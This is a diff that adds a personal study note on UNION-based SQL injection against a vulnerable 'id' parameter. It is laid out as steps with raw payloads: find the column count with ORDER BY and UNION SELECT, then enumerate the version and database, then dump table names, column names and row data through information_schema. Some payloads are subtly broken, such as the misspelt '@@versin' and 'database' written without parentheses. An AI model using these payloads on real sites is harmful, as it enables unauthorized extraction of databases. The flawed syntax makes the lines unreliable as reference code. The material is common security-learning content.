@@ -1,0 +1,32 @@
+#sql injection note points
+
+In the union attack, coloumn number must match and datatype too.
+first attempt to know number of colums
+
+Step 1   =================== Know Number of Columns ======================
+
+         way one (page.php?id=1 is vulnarable)
+   
+         ?id=1 or ?id=1'       order by 1 
+                               order by 2
+                               order by 3
+                               ..........
+                               order by N
+
+         OR
+                               union all select null
+                               union all select null,null
+                               union all select null,null,null
+
+                               union all select 1
+                               union all select 1,2,3,4,5
+
+Step 2  ==================== enumration ==================================
+ 
+                               union all select 1,2,group_concat(@@versin,database()),4,5
+                               
+                  table names dump       union all select 1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema=database
+
+                  column Dump            union all select 1,2,group_concat(column_name),4,5 from information_schema.columns where table_name='<Table Name>'
+  
+                  data Dump              union all select 1,2,group_concat(<column list>),4,5 from <table name>
